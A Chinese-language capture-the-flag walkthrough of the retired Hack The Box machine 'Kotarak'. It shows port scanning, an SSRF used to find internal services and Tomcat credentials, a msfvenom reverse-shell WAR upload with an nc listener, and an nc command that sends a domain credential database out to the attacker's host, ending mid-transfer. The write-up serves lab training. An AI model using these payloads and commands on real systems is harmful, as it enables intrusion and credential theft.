## 前言
hackthebox是一个在线的渗透平台，通过渗透获取邀请码，即可在这个平台上注册一个账号。
该平台的在线靶机一共20台，每周会下线一台靶机，如果靶机下线了呢，分数就会全部清空。而成功渗透靶机就能获取一定的分数，分数够了就能提升等级。
在线的靶机都是没有writeup的，所以你的等级很大程度可以证明你的渗透实战能力。
该平台一共7个用户等级，刚注册是等级Noob：
  1. Noob 无知者
  2. script kiddle 脚本小子
  3. hacker 黑客
  4. Pro hacker 专业黑客
  5. Elite Hacker 精英黑客
  6. Guru 大师
  7. Omniscient （最高等级）无所不知者
靶机的分数为20-50分
  1. 20分-easy 简单
  2. 30分-medium 中等难度
  3. 40分-hard 困难的
  4. 50分-Insane 疯狂的
下面介绍关于过期的机器 **kotarak** 的渗透过程，难度等级为hard。
## 扫描
用masscan与Nmap工具分别输入以下指令:
    masscan -p1-65535,U:1-65535 10.10.10.55 --rate=1000 -e tun0 -p1-65535,U:1-65535 > ports
    ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
    nmap -Pn -sV -sC -sU -sT -p$ports 10.10.10.55
扫描结果提示，22、8080、8009以及60000端口开放。
## 8080web探测
首先访问 Status 404 - /，状态码404 not found。于是枚举目录。
> dirb 
    + http://10.10.10.55:8080/docs (CODE:**302**|SIZE:0)
    + http://10.10.10.55:8080/examples (CODE:302|SIZE:0)
    + http://10.10.10.55:8080/favicon.ico (CODE:200|SIZE:21630)
    + http://10.10.10.55:8080/host-manager (CODE:302|SIZE:0)
    + http://10.10.10.55:8080/manager (CODE:302|SIZE:0)
发现基本上都是302重定向。
于是访问下 
发现302重定向到
并且状态码是404。但是404页面有个提示，tomcat 7重构并且有些urls已经改变。所有使用管理应用的urls现在应该使用如下选项：
> /manager/html for the HTML GUI
>
> /manager/text for the text interface
>
> /manager/jmxproxy for the JMX proxy
>
> /manager/status for the status pages
我们就按照所说的访问一下。发现所给的urls都需要登陆才能访问。
再搜索下 Apache Tomcat
8.5.5。[参考](http://blog.csdn.net/posonrick/article/details/72566875)
tomcat是java web服务器
尝试访问： ，200ok。
## 60000端口-web探测
### SSRF-服务端请求伪造
没有经验的小白先跟whale学习下。
该漏洞经常出现在服务端，一些web应用程序经常从其他server获取信息。
> 客户端 （去B服务器取回图片 !）——》A服务端（执行）————》B服务器（返回图片）————》A服务器（执行完毕）————》客户端（收到图片）
#### 攻击方式：
> 客户端（去扫描B服务器 ！）——》A服务端（执行）————》B服务器（返回数据包）————》A服务器（执行完毕）————》客户端（收到扫描结果）
服务器没有过滤客户端的请求。本来设计的功能想法是好的，但是攻击者不打算 **以设计者的想法** 来使用这个功能。
    使用这个私人的web浏览器匿名在网络冲浪，请不要滥用它。
  * Trying
    python -m SimpleHTTPServer
    ifconfig
    在本地开启服务器，查看本地ip。
尝试用浏览器上的该功能访问下本地，是否成功。
输入`http://本地ip：8000`
浏览器跳转到一个地址`http://10.10.10.55:60000/url.php?path=http://本地ip:8000`
成功访问客户端本地地址。
  * Trying
然后尝试ssrf，提交`file:///etc/passwd`
返回`try harder`
尝试File FIlE ,同样的返回结果。说明目标机可能用正则表达式限制了file这个字符。
  * Trying
尝试`http://localhost:60000` 返60000端口上的正常页面。
因为端口扫描那一步 **客户端访问都是302重定向**
，需要登陆才能访问，于是我们通过60000端口上的“搜索”功能，绕过对客户端的限制。让服务器替我们获取想要的信息。
# wfuzz
  * 这是一个web扫描软件
可以用`wfuzz -h` 查看使用方式
我们使用下列参数，扫描服务器开放的端口
`wfuzz -c -z range,1-65535
http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ`
图片中，2 Ch是响应的字符串，访问后发现没有任何有价值的东西，于是我们忽略它。
`wfuzz -c -z range,1-65535 --hl=2
http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ`
扫描后，我们得到了非2 Ch的响应结果。
看到了很多端口信息，因为 **客户端nmap扫描是远程访问** ，有 防火墙等等，所以在这里会得到更加详细的（在远程扫描不到的）端口信息。
  * trying
一个一个访问这些开放了的端口，`http://10.10.10.55:60000/url.php?path=http://localhost:端口`
在888端口，找到了一个备份页面backup。
  * Trying
`http://10.10.10.55:60000/url.php?path=http://localhost:888/?doc=backup`
得到了可能是tomcat配置文件中的用户名密码。
（有一个小技巧，在端口扫描那一步，得到了不能访问的文件名，可以用ssrf去访问，来获取敏感文件。）
我们用这个口令登陆端口扫描那一步获得的地址`manager/html`
#### **获取shell**
刚刚通过ssrf获取敏感文件，从而突破防线，接下来，我们要获取一个shell。
因为主页面上有上传功能，提示：
    deploy directory or WAR file located on server.
    war file to deploy 
    select war file to upload.
暗示了我们可以上传一个war类型的反弹shell。
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=1234 -f war >
> ippsec.war
`War——web归档文件，war文件用于封装web模块。web模块可以代表一个独立的web应用程序。`
  * Trying
成功上传——本地nc监听80端口`nc -lnvp 1234`——浏览器访问payload地址，即可获得一个shell。
  * shell中运行
`python -c 'import pty;pty.spawn("/bin/bash")'` 于是获得一个bash shell。
  * find . -name "user.txt" 2>/dev/null
`/home/atanas/user.txt` 无读取选项
## 用户提权
经过之前步骤，我们获得了一个tomcat用户权限的shell，可以看到有一些文件是不允许访问的。接下来看看如何获取root权限。
`cd /home/tomcat/to_archive/pentest_data`
在用户家目录下，发现一个ntds.dit文件。以前没做过域渗透，(⊙﹏⊙)稍微去了解了下，ntds.dit即目录数据库，用于windows域。
### 文件传输
将那两个文件用nc发送到攻击机本地
    kali:   nc -lvnp 443 > SYSTEM
    shell:  nc 10.10.14.5 443 <  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin